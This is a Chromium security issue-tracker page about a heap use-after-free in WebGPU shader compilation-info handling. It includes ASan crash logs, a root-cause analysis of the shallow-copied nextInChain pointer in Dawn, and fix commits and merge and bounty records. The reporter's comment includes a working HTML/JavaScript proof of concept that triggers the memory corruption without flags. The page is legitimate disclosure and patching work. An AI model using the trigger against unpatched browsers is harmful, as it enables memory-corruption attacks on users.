# WebGPU: Heap Use-After-Free in GPUShaderModule via OnCompilationInfoCallback

| Field | Value |
|-------|-------|
| **Issue ID** | [480195317](https://issues.chromium.org/issues/480195317) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>WebGPU |
| **Platforms** | Windows |
| **Reporter** | fa...@gmail.com |
| **Assignee** | lo...@google.com |
| **Created** | 2026-01-31 |
| **Bounty** | $7,000.00 |

## Description

```
SUMMARY: AddressSanitizer: heap-use-after-free C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webgpu\gpu_shader_module.cc:114:18 in blink::GPUShaderModule::OnCompilationInfoCallback(class blink::ScriptPromiseResolver<class blink::GPUCompilationInfo> *, enum wgpu::CompilationInfoRequestStatus, struct wgpu::dawn::wire::client::CompilationInfo const *)
Shadow bytes around the buggy address:
  0x124fe37e7200: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x124fe37e7280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x124fe37e7300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x124fe37e7380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x124fe37e7400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa f7 fa
=>0x124fe37e7480: fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x124fe37e7500: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x124fe37e7580: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x124fe37e7600: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x124fe37e7680: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x124fe37e7700: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==4852==ADDITIONAL INFO

==4852==Note: Please include this section with the ASan report.
Task trace:
    #0 0x021599a48a39 in IPC::ChannelAssociatedGroupController::Accept(class mojo::Message *) C:\b\s\w\ir\cache\builder\src\ipc\ipc_mojo_bootstrap.cc:1138:13


Command line: `"C:\Users\Admin\Desktop\Chrome fuzzer\chrome\chrome.exe" --type=renderer --user-data-dir="C:\\Users\\Admin\\AppData\\Local\\Temp\\tmpf7jl4h1g" --no-pre-read-main-dll --no-sandbox --file-url-path-alias="/gen=C:\Users\Admin\Desktop\Chrome fuzzer\chrome\gen" --video-capture-use-gpu-memory-buffer --lang=en-GB --device-scale-factor=1 --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=5 --time-ticks-at-unix-epoch=-1769786563135465 --launch-time-ticks=40666507758 --metrics-shmem-handle=3860,i,6817503083525800518,15355169682405378788,2097152 --field-trial-handle=1900,i,313222924352205498,12967792872880803706,262144 --variations-seed-version --pseudonymization-salt-handle=2024,i,13479560096412695005,7287471168251623047,4 --trace-process-track-uuid=3190708990997080739 --mojo-platform-channel-handle=3856 /prefetch:1`


MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

```
#### VERSION

Version 146.0.7659.0 (Developer Build) (64-bit)

#### REPRODUCTION CASE

Build: [win32-release\_x64%2Fasan-win32-release\_x64-1577008](https://www.googleapis.com/download/storage/v1/b/chromium-browser-asan/o/win32-release_x64%2Fasan-win32-release_x64-1577008.zip?generation=1769753468800796&alt=media)

Run: `./chrome.exe --no-sandbox poc.html`

---

Reporter credit: Shaheen Fazim

## Attachments

- deleted (application/octet-stream, 0 B)
- [poc.html](attachments/poc.html) (text/html, 1.2 KB)
- [full-asan.txt](attachments/full-asan.txt) (text/plain, 77.2 KB)
- [screenrecord.mp4](attachments/screenrecord.mp4) (video/mp4, 798.0 KB)
- deleted (application/octet-stream, 0 B)
- [poc.html](attachments/poc.html) (text/html, 454 B)
- Screen Recording.mov (video/quicktime, 29.4 MB)
- [asan-log.txt](attachments/asan-log.txt) (text/plain, 33.9 KB)

## Timeline

### fa...@gmail.com (2026-02-02)

# Root Cause Analysis: GPUShaderModule Use-After-Free

## Vulnerability Summary

A Heap-Use-After-Free (UAF) vulnerability exists in the handling of `GPUCompilationInfo` in Blink/Dawn. The vulnerability is triggered when `GPUShaderModule::OnCompilationInfoCallback` accesses the `nextInChain` field of a `WGPUCompilationMessage` after the underlying wire buffer has been freed.

## Root Cause

The root cause lies in [src/dawn/wire/client/ShaderModule.cpp](https://dawn.googlesource.com/dawn/+/refs/heads/main/src/dawn/wire/client/ShaderModule.cpp), specifically in `ShaderModule::CompilationInfoEvent::ReadyHook`.

When a [GetCompilationInfo](https://dawn.googlesource.com/dawn/+/refs/heads/main/src/dawn/wire/client/ShaderModule.cpp#125-148) callback is received from the GPU process, the Dawn Wire client deserializes the `WGPUCompilationInfo` struct into a temporary buffer managed by `WireDeserializeAllocator`. This buffer is valid only for the duration of the command processing loop (`Client::HandleCommands`).

To support asynchronous callback invocation (via [EventManager](https://dawn.googlesource.com/dawn/+/refs/heads/main/src/dawn/wire/client/EventManager.cpp#91-93)), [ReadyHook](https://dawn.googlesource.com/dawn/+/refs/heads/main/src/dawn/wire/client/ShaderModule.cpp#60-85) attempts to create a deep copy of the `WGPUCompilationInfo` data:

```
// src/dawn/wire/client/ShaderModule.cpp

// Deep copy the WGPUCompilationInfo
mShader->mMessageStrings.reserve(info->messageCount);
mShader->mMessages.reserve(info->messageCount);
for (size_t i = 0; i < info->messageCount; i++) {
    DAWN_ASSERT(info->messages[i].length != WGPU_STRLEN);
    
    // 1. Deep copy the message text
    mShader->mMessageStrings.push_back(ToString(info->messages[i].message));
    
    // 2. Shallow copy the message struct
    mShader->mMessages.push_back(info->messages[i]);
    
    // 3. Update the message pointer to the deep-copied string
    mShader->mMessages[i].message = ToOutputStringView(mShader->mMessageStrings[i]);
}

```

**The Flaw:**
The code performs a shallow copy of the `WGPUCompilationMessage` struct at step 2. While it correctly fixes the `message` string pointer (step 3), it **fails to deep copy or nullify the `nextInChain` pointer**.

As a result, `mShader->mMessages[i].nextInChain` retains the pointer to the chained structs (e.g., `DawnCompilationMessageUtf16`) residing in the `WireDeserializeAllocator`'s ephemeral buffer.

## Trigger Flow

1. **Deserialization**: `ReturnShaderModuleGetCompilationInfoCallbackCmd` is received. `WireDeserializeAllocator` allocates memory for `WGPUCompilationInfo` and any chained structs (like `DawnCompilationMessageUtf16`).
2. **Partial Copy**: `ShaderModule::CompilationInfoEvent::ReadyHook` copies the info, preserving the dangling `nextInChain` pointer.
3. **Buffer Reset**: `Client::HandleCommands` completes, and `WireDeserializeAllocator::Reset()` frees the buffer.
4. **Callback**: The `evt` is triggered later via `EventManager::ProcessPollEvents`.
5. **Crash**: Blink's `GPUShaderModule::OnCompilationInfoCallback` iterates the messages and traverses `nextInChain` to look for UTF-16 messages, accessing the freed memory.

```
// Blink code triggering the crash
for (const auto& message : info_span) {
    // ...
    // message.nextInChain points to freed memory
    for (const auto* chain = message.nextInChain; chain != nullptr; chain = chain->nextInChain) {
        // Accessing chain triggers UAF
        if (chain->sType == wgpu::SType::DawnCompilationMessageUtf16) { ... }
    }
}

```
## Recommended Fix

The [ReadyHook](https://dawn.googlesource.com/dawn/+/refs/heads/main/src/dawn/wire/client/ShaderModule.cpp#60-85) must either:

1. Formally deep-copy the entire chain of `nextInChain` structures (which requires handling all possible chained types).
2. Or, if extensions are not critically needed for the cached copy, explicitly set `nextInChain` to `nullptr` in the copy to prevent dereferencing dangling pointers.

### cl...@appspot.gserviceaccount.com (2026-02-02)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5686437814927360.

### an...@chromium.org (2026-02-02)

[security shepherd] @lo...@google.com, can you PTAL? Is this a duplicate of <https://issues.chromium.org/480714335>?

### 24...@project.gserviceaccount.com (2026-02-02)

Testcase 5686437814927360 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=5686437814927360.

### lo...@google.com (2026-02-02)

Yes, this looks like it is very likely a duplicate. Marking it as so.

### ja...@google.com (2026-02-03)

[security triage] I pinged lokokung because it looked like we marked the wrong one as duplicate. They've fixed it now (thanks lokokung!)

### dx...@google.com (2026-02-03)

Project: dawn  

Branch:  main  

Author:  Lokbondo Kung [lokokung@google.com](mailto:lokokung@google.com)  

Link:    <https://dawn-review.googlesource.com/288576>

[dawn][wire] Make sure to copy chained structs in CompilationMessage.

---


Expand for full commit details
```
     
    - Adds chained struct handling loop to copy over Utf18 structs in 
      compilation message. 
    - Updates tests to verify that we are doing a copy of the results 
      from the server instead of directly using any memory addresses. 
     
    Bug: 480195317 
    Change-Id: If767970f1735d5000c51a97f55d1b68be1135281 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/288576 
    Commit-Queue: Corentin Wallez <cwallez@chromium.org> 
    Auto-Submit: Loko Kung <lokokung@google.com> 
    Reviewed-by: Corentin Wallez <cwallez@chromium.org>

```

---

Files:

- M `src/dawn/tests/unittests/wire/WireShaderModuleTests.cpp`
- M `src/dawn/wire/client/ShaderModule.cpp`
- M `src/dawn/wire/client/ShaderModule.h`

---

Hash: 55dd88a158781aa850539be52f6c178c17e1663c  

Date: Tue Feb 3 08:54:47 2026


---

### dx...@google.com (2026-02-03)

Project: chromium/src  

Branch:  main  

Author:  chromium-autoroll [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com)  

Link:    <https://chromium-review.googlesource.com/7541334>

Roll Dawn from d056298c4999 to fc03b7cf7cd1 (5 revisions)

---


Expand for full commit details
```
     
    https://dawn.googlesource.com/dawn.git/+log/d056298c4999..fc03b7cf7cd1 
     
    2026-02-03 dawn-autoroll@skia-public.iam.gserviceaccount.com Roll ANGLE from d7139503a3f3 to b119b6a42f77 (6 revisions) 
    2026-02-03 lokokung@google.com [dawn][wire] Make sure to copy chained structs in CompilationMessage. 
    2026-02-03 dawn-autoroll@skia-public.iam.gserviceaccount.com Roll DirectX Shader Compiler from 4687c52d6b47 to ba54caa39f4e (1 revision) 
    2026-02-03 lehoangquyen@chromium.org D3D11: Defer buffer unmapping on destruction to avoid lock contention 
    2026-02-03 lehoangquyen@chromium.org D3D11: Avoid lock contention in buffer MapAtCreation 
     
    If this roll has caused a breakage, revert this CL and stop the roller 
    using the controls here: 
    https://autoroll.skia.org/r/dawn-chromium-autoroll 
    Please CC alanbaker@google.com,cwallez@google.com on the revert to ensure that a human 
    is aware of the problem. 
     
    To file a bug in Dawn: https://bugs.chromium.org/p/dawn/issues/entry 
    To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry 
     
    To report a problem with the AutoRoller itself, please file a bug: 
    https://issues.skia.org/issues/new?component=1389291&template=1850622 
     
    Documentation for the AutoRoller is here: 
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md 
     
    Cq-Include-Trybots: luci.chromium.try:dawn-android-arm-deps-rel;luci.chromium.try:dawn-android-arm64-deps-rel;luci.chromium.try:dawn-linux-x64-deps-rel;luci.chromium.try:dawn-mac-x64-deps-rel;luci.chromium.try:dawn-mac-arm64-deps-rel;luci.chromium.try:dawn-win10-x64-deps-rel;luci.chromium.try:dawn-win10-x86-deps-rel;luci.chromium.try:dawn-win11-arm64-deps-rel;luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:gpu-fyi-cq-mac-arm64;luci.chromium.try:win_optional_gpu_tests_rel;luci.chromium.try:gpu-fyi-cq-android-arm64 
    Bug: chromium:422741977,chromium:480195317 
    Tbr: alanbaker@google.com 
    Change-Id: Ia634290e4ec24c74a70675067d6e8a421c0647f6 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7541334 
    Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1578690}

```

---

Files:

- M `DEPS`
- M `third_party/dawn`

---

Hash: [ef0fcc2af46192a7c331e001b7d96d0f1ca4f635](https://chromiumdash.appspot.com/commit/ef0fcc2af46192a7c331e001b7d96d0f1ca4f635)  

Date: Tue Feb 3 11:52:44 2026


---

### ch...@google.com (2026-02-03)

Dear owner, thanks for fixing this bug. We've reopened it because:

- Security bugs need the Severity (S0-S3) and the Found In set, which will enable the bots to request merges to the correct branches (as well as helping out our vulnerability reward and CVE processes). Please consult with any Chrome security contact ([security@chromium.org](mailto:security@chromium.org)) to arrange to set these labels. Severity guidelines: <https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security/severity-guidelines.md#severity-guidelines-for-security-issues> FoundIn guidelines: <https://chromium.googlesource.com/chromium/src/+/main/docs/security/security-labels.md#labels-relevant-for-any-type_bug_security>
  After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### ja...@chromium.org (2026-02-03)

[security triage] Marking this as severity High because it is memory corruption in a sandboxed process.

Please note that the severity may change as we investigate the bug further.

### ja...@chromium.org (2026-02-03)

Hi lokokung@, can you add the impacted OSes to the bug attributes? Is it desktop only?

Also, does this impact all the way back to Extended Stable, or is it a newer bug (Beta, Dev, Canary etc)?

### fa...@gmail.com (2026-02-03)

Crashes on the stable build: Version 146.0.7655.3 (Official Build), 64-bit, on Windows 11.

### ja...@google.com (2026-02-03)

Thanks for the additional information, reporter.

From lokokung we think it was introduced in [crrev.com/c/7080760](https://crrev.com/c/7080760) which first got released in 145. Setting found-in to 145.

### ch...@google.com (2026-02-04)

Security Merge Request Consideration: Requesting merge to beta (M145) because latest trunk commit (1578690) appears to be after beta branch point (1568190).
Security Merge Request - Manual Review: Merge review required: a commit with DEPS changes was detected.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [145].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### lo...@google.com (2026-02-04)

This Dawn CL needs to be backmerged: <https://dawn-review.googlesource.com/288576>

### dr...@chromium.org (2026-02-05)

No crashes in Canary. Approving merge to M145.

### ch...@google.com (2026-02-05)

Merge review required: a commit with DEPS changes was detected.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: andywu (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)

### dx...@google.com (2026-02-05)

Project: dawn  

Branch:  chromium/7632  

Author:  Lokbondo Kung [lokokung@google.com](mailto:lokokung@google.com)  

Link:    <https://dawn-review.googlesource.com/289195>

[dawn][wire] Make sure to copy chained structs in CompilationMessage.

---


Expand for full commit details
```
     
    - Adds chained struct handling loop to copy over Utf18 structs in 
      compilation message. 
    - Updates tests to verify that we are doing a copy of the results 
      from the server instead of directly using any memory addresses. 
     
    Bug: 480195317 
    Change-Id: If767970f1735d5000c51a97f55d1b68be1135281 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/288576 
    Commit-Queue: Corentin Wallez <cwallez@chromium.org> 
    Auto-Submit: Loko Kung <lokokung@google.com> 
    Reviewed-by: Corentin Wallez <cwallez@chromium.org> 
    (cherry picked from commit 55dd88a158781aa850539be52f6c178c17e1663c) 
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/289195

```

---

Files:

- M `src/dawn/tests/unittests/wire/WireShaderModuleTests.cpp`
- M `src/dawn/wire/client/ShaderModule.cpp`
- M `src/dawn/wire/client/ShaderModule.h`

---

Hash: d9f5a980bb5a4baeb7d9c1fef89a39789a6cd9fb  

Date: Thu Feb 5 08:59:25 2026


---

### fa...@gmail.com (2026-02-08)

Hi, after working on this issue this week, I found that I am able to trigger this issue **without the `--no-sandbox` flag** using a new trigger proof-of-concept, tested on **macOS**.

```
SUMMARY: AddressSanitizer: heap-use-after-free (/Users/admin/Desktop/chrome-fuzzer/chrome/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/145.0.7569.0/Chromium Framework:arm64+0x22b50744) in blink::GPUShaderModule::OnCompilationInfoCallback(blink::ScriptPromiseResolver<blink::GPUCompilationInfo>*, wgpu::CompilationInfoRequestStatus, wgpu::dawn::wire::client::CompilationInfo const*)+0xa8c
Shadow bytes around the buggy address:
  0x61d000066600: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x61d000066680: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x61d000066700: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x61d000066780: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x61d000066800: fa fa fa fa fa fa fa fa fa fa fa fa fa fa f7 fa
=>0x61d000066880: fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x61d000066900: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x61d000066980: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x61d000066a00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x61d000066a80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x61d000066b00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==1193==ADDITIONAL INFO

==1193==Note: Please include this section with the ASan report.
Task trace:
    #0 0x00035d0dad20 in IPC::ChannelAssociatedGroupController::Accept(mojo::Message*)+0x7c4 (/Users/admin/Desktop/chrome-fuzzer/chrome/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/145.0.7569.0/Chromium Framework:arm64+0x14f02d20)


Command line: `/Users/admin/Desktop/chrome-fuzzer/chrome/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/145.0.7569.0/Helpers/Chromium Helper (Renderer).app/Contents/MacOS/Chromium Helper (Renderer) --type=renderer --user-data-dir=/var/folders/cf/5ykypmzj7_35mhngh_rr8bcm0000gn/T/tmfp9isgw5ec --subproc-heap-profiling --file-url-path-alias=/gen=/Users/admin/Desktop/chrome-fuzzer/chrome/gen --lang=en-US --num-raster-threads=4 --enable-zero-copy --enable-gpu-memory-buffer-compositor-resources --enable-main-frame-before-activation --renderer-client-id=6 --time-ticks-at-unix-epoch=-1770529325735085 --launch-time-ticks=3335283702 --shared-files --metrics-shmem-handle=1752395122,r,17523536057972110955,17001555626685896450,2097152 --field-trial-handle=1718379636,r,2360521213983470727,11806886796147519095,262144 --variations-seed-version --trace-process-track-uuid=3190708991934122588 --seatbelt-client=75`


MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

```

proof-of-concept:

```
<!DOCTYPE html>
<html>
<body>
<script type="module">
const device = await (await navigator.gpu.requestAdapter()).requestDevice();

let code = "";
for (let i = 0; i < 3000; i++) {
    code += `fn f_${i}() { var unused_${i} : i32; return; unused_${i} = 1; }\n`;
}
code += "@compute @workgroup_size(1) fn main() { f_0(); }";

const mod = device.createShaderModule({ code });
for(let i=0; i<5; i++) {
    mod.getCompilationInfo();
}
</script>
</body>
</html>

```

Run: `chrome/Chromium.app/Contents/MacOS/Chromium poc.html`

While the previous proof-of-concept required the --no-sandbox flag to demonstrate the underlying memory corruption, this improved proof-of-concept demonstrates a zero-interaction tested on macOS successfully triggers the GPU process vulnerability without requiring any flags.

### lo...@google.com (2026-02-09)

Hi, a fix has already been landed for this. What version of Chromium were you still able to reproduce on?

### fa...@gmail.com (2026-02-09)

This was tested on the vulnerable version `145.0.7569.0 (Developer Build) (arm64)` prior to the fix. I am verifying the impact and can confirm that it is fixed in the build [asan-mac-release-arm64-1581751](https://www.googleapis.com/download/storage/v1/b/chromium-browser-asan/o/mac-release-arm64%2Fasan-mac-release-1581751.zip?generation=1770658527375055&alt=media).

### ch...@google.com (2026-02-09)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### fa...@gmail.com (2026-02-12)

Hi, related modified proof-of-concept working on the versions before the fix. I had attached the wrong ASAN earlier. Here is the actual ASAN log and proof-of-concept demo.

### ch...@google.com (2026-02-13)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### sp...@google.com (2026-02-19)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $7000.00 for this report.

Rationale for this decision:
Baseline memory corruption in a sandboxed process


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### sp...@google.com (2026-03-11)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $3000.00 for this report.

Rationale for this decision:
Additional award for high quality


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-05-13)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> Baseline memory corruption in a sandboxed process

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/480195317)*
